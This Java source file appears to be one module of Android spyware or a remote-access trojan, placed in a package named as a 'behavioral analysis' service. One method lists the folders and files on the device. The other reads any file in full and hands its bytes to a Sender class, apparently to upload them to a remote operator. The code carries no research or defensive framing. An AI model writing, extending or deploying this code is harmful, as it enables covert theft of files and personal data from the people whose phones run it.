package com.behavioralanalysis.service;

import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.sql.PreparedStatement;

public class Files {
    public static JSONArray get(String path) {
        JSONArray array = new JSONArray();

        File dir = new File(path);
        if (!dir.canRead()) {
            try {
                JSONObject object = new JSONObject();
                object.put("error", "Access denied");
                Sender.sendError(object);
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }

        File[] files = dir.listFiles();
        try {
            if (files != null) {
                JSONObject parrentObj = new JSONObject();
                parrentObj.put("name", ".//");
                parrentObj.put("isDir", true);
                parrentObj.put("path", dir.getParent());
                array.put(parrentObj);
                for (File file : files) {
                    if (!file.getName().startsWith(".")) {
                        JSONObject object = new JSONObject();
                        object.put("name", file.getName());
                        object.put("isDir", file.isDirectory());
                        object.put("path", file.getAbsolutePath());
                        array.put(object);
                    }
                }
            }
        } catch (JSONException ex) {
            ex.printStackTrace();
        }

        return array;
    }

    public static void download(String path) {
        if (path == null) {
            return;
        }

        File file = new File(path);

        if (file.exists()) {
            int size = (int)file.length();
            byte[] data = new byte[size];
            try {
                BufferedInputStream buf = new BufferedInputStream(new FileInputStream(file));
                buf.read(data, 0, data.length);
                buf.close();
                JSONObject object = new JSONObject();
                object.put("name", file.getName());
                object.put("buffer", data);
                Sender.sendFile(object);
            } catch (FileNotFoundException ex) {
                ex.printStackTrace();
            } catch (IOException ex) {
                ex.printStackTrace();
            } catch (JSONException ex) {
                ex.printStackTrace();
            }
        }
    }
}
